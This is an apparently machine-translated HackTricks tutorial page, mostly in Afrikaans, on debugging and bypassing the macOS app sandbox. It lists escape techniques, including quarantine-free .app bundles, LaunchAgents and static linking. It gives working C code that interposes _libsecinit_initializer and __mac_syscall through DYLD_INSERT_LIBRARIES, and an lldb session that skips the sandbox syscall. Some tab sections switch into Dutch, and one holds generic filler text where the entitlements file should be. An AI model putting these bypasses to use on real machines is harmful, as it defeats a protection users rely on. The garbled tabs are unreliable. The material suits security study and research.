# macOS Sandbox Debug & Bypass

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Sandbox laaiproses

<figure><img src="../../../../../.gitbook/assets/image (898).png" alt=""><figcaption><p>Beeld vanaf <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

In die vorige beeld is dit moontlik om te sien **hoe die sandput gelaai sal word** wanneer 'n aansoek met die toestemming **`com.apple.security.app-sandbox`** uitgevoer word.

Die samesteller sal `/usr/lib/libSystem.B.dylib` aan die binêre lê.

Daarna sal **`libSystem.B`** ander verskeie funksies aanroep totdat die **`xpc_pipe_routine`** die toestemmings van die aansoek na **`securityd`** stuur. Securityd kontroleer of die proses binne die Sandput geïsoleer moet word, en indien wel, sal dit geïsoleer word.\
Laastens sal die sandput geaktiveer word met 'n oproep na **`__sandbox_ms`** wat **`__mac_syscall`** sal aanroep.

## Moontlike Oorspronge

### Oorsprong van die karantynatribuut

**Lêers wat deur geïsoleerde prosesse geskep word** kry die **karantynatribuut** om sandputontsnapping te voorkom. As jy egter daarin slaag om **'n `.app`-vouer sonder die karantynatribuut** binne 'n geïsoleerde aansoek te skep, kan jy die aansoekbundel-binêre lêer laat wys na **`/bin/bash`** en 'n paar omgewingsveranderlikes in die **plist** byvoeg om **`open`** te misbruik om die nuwe aansoek ongeïsoleerd te **begin**.

Dit is wat gedoen is in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

{% hint style="danger" %}
Daarom, op hierdie oomblik, as jy net in staat is om 'n vouer met 'n naam wat eindig op **`.app`** sonder 'n karantynatribuut te skep, kan jy die sandput ontsnap omdat macOS slegs die **karantyn**-atribuut in die **`.app`-vouer** en in die **hoofuitvoerbare lêer** kontroleer (en ons sal die hoofuitvoerbare lêer na **`/bin/bash`** wys).

Let daarop dat as 'n .app-bundel reeds gemagtig is om uit te voer (dit het 'n karantyn xttr met die gemagtig om uit te voer-vlag daarop), kan jy dit ook misbruik... behalwe dat jy nou nie binne **`.app`**-bundels kan skryf tensy jy sekere bevoorregte TCC-perms het (wat jy nie binne 'n hoë sandput sal hê nie).
{% endhint %}

### Misbruik van Open-funksionaliteit

In die [**laaste voorbeelde van Word-sandputontsnapping**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) kan gesien word hoe die **`open`**-opdragfunksionaliteit misbruik kan word om die sandput te omseil.

{% content-ref url="macos-office-sandbox-bypasses.md" %}
[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
{% endcontent-ref %}

### Begin Agente/Daeëmons

Selfs as 'n aansoek **bedoel is om geïsoleer te word** (`com.apple.security.app-sandbox`), is dit moontlik om die sandput te omseil as dit vanaf 'n Beginagent uitgevoer word (`~/Library/LaunchAgents`) byvoorbeeld.\
Soos verduidelik in [**hierdie pos**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), as jy volharding wil verkry met 'n aansoek wat geïsoleer is, kan jy dit outomaties laat uitvoer as 'n Beginagent en miskien kwaadwillige kode inspuit via DyLib-omgewingsveranderlikes.

### Misbruik van Outomatiese Beginlokasies

As 'n geïsoleerde proses kan **skryf** op 'n plek waar **later 'n ongeïsoleerde aansoek die binêre lêer gaan uitvoer**, sal dit in staat wees om te **ontsnap deur net** die binêre lêer daar te plaas. 'n Goeie voorbeeld van hierdie soort lokasies is `~/Library/LaunchAgents` of `/System/Library/LaunchDaemons`.

Hiervoor mag jy selfs **2 stappe** nodig hê: Om 'n proses met 'n **meer inskiklike sandput** (`file-read*`, `file-write*`) jou kode te laat uitvoer wat eintlik in 'n plek sal skryf waar dit **ongeïsoleerd uitgevoer sal word**.

Kyk na hierdie bladsy oor **Outomatiese Beginlokasies**:

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### Misbruik van ander prosesse

As jy vanuit die sandputproses in staat is om **ander prosesse** wat in minder beperkende sandpute (of geen) loop, te **kompromitteer**, sal jy kan ontsnap na hul sandpute:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### Statis Kompilering & Dinamies koppeling

[**Hierdie navorsing**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) het 2 maniere ontdek om die Sandput te omseil. Omdat die sandput vanuit die gebruikersruimte toegepas word wanneer die **libSystem**-biblioteek gelaai word. As 'n binêre lêer dit kon vermy om dit te laai, sou dit nooit geïsoleer word nie:

* As die binêre lêer **heeltemal staties gekompileer** was, kon dit vermy om daardie biblioteek te laai.
* As die **binêre lêer nie enige biblioteke hoef te laai** nie (omdat die koppelaar ook in libSystem is), sal dit nie libSystem hoef te laai nie.

### Skelkodes

Let daarop dat **selfs skelkodes** in ARM64 in `libSystem.dylib` gekoppel moet word:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Regte

Let daarop dat selfs al is sommige **aksies toegelaat deur die sandput**, as 'n aansoek 'n spesifieke **regte** het, soos in:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Omgang

Vir meer inligting oor **Interposting** kyk:

{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
{% endcontent-ref %}

#### Interpost `_libsecinit_initializer` om die sandput te voorkom
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall` om die Sandboks te voorkom

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Foutopsporing en omseil Sandboks met lldb

Laten ons 'n toepassing saamstel wat gesandboks moet wees:

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% endtab %}

{% tab title="entitlements.xml" %} 
### macOS Sandboxing: Foutopsporing en bypass

#### Debugging van macOS Sandbox

Om de macOS-sandbox te debuggen, kunt u de `sandbox-exec`-tool gebruiken om een ​​programma binnen de sandbox-omgeving uit te voeren en de uitvoer te controleren. U kunt ook de Console-applicatie gebruiken om systeemlogs te bekijken voor eventuele sandbox-gerelateerde fouten.

#### Bypassing macOS Sandbox

Om de macOS-sandbox te omzeilen, kunt u proberen om de sandboxbeperkingen te omzeilen door gebruik te maken van kwetsbaarheden in het doelsysteem of door het aanpassen van de toegewezen entitlements in het `entitlements.xml`-bestand. Het is ook mogelijk om bepaalde API-oproepen te verstoren om de sandbox te omzeilen. Let op: het omzeilen van de macOS-sandbox is een risicovolle activiteit en kan leiden tot beveiligingsproblemen op het systeem. Gebruik deze kennis verantwoordelijk en alleen voor legitieme doeleinden. 
{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% endtab %}

{% tab title="Info.plist" %}  
### Inligting.plist

Die `Info.plist` lêer bevat inligting oor die program, insluitend die toestemmings wat dit benodig om te hardloop. Dit is belangrik vir die sandboks om die korrekte toestemmings in hierdie lêer te hê om te verseker dat die program binne die beperkings van die sandboks bly.  
{% endtab %}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

Kompilieer dan die app:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
Die program sal probeer om die lêer **`~/Desktop/del.txt`** te **lees**, wat die **Sandbox nie sal toelaat** nie.\
Skep 'n lêer daarin, sodra die Sandbox omseil is, sal dit in staat wees om dit te lees:
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

Laat ons die toepassing foutopspoor om te sien wanneer die Sandboks gelaai word:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
{% hint style="warning" %}
**Selfs met die Sandboks omseil, sal TCC** die gebruiker vra of hy die proses wil toelaat om lêers vanaf die lessenaar te lees
{% endhint %}

## Verwysings

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
